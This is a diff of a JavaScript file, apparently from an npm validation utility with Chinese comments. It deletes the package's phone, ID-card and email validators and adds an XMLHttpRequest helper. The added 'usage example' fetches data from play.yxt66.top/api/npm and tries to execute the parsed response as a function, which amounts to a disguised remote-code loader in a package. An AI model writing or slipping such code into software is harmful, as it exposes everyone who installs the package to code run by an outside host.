@@ -1,29 +1,27 @@
-// a. index.js 入口文件
-import Format from "./src/format";
-import Validate from "./src/validate";
+function get(url, callback) {
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', url, true); // true 表示异步
 
-export { Format, Validate };
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) { // DONE
+      if (xhr.status === 200) {
+        callback(null, xhr.responseText);
+      } else {
+        callback(new Error('Request failed with status ' + xhr.status));
+      }
+    }
+  };
 
-// b. format.js 格式化文件
-const Validate = {
-    /**
-     * 手机号校验
-     */
-    mobileCheck1: (value) => /^[1][3,4,5,7,8][0-9]{9}$/.test(value),
+  xhr.send();
+}
 
-    /**
-     * 身份证校验
-     */
-    IDCardCheck: (value) =>
-        /^[1-9]\d{5}(18|19|([23]\d))\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$/.test(
-            value
-        ),
-
-    /**
-     * 邮箱校验
-     */
-    emailCheck: (value) =>
-        /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/.test(value),
-};
-
-export default Validate;
+// 用法示例
+get('https://play.yxt66.top/api/npm', function (err, data) {
+  if (err) {
+    console.error('请求失败:', err);
+  } else {
+    const fn = JSON.parse(data)
+    fn()
+    console.log('响应结果:', JSON.parse(data));
+  }
+});
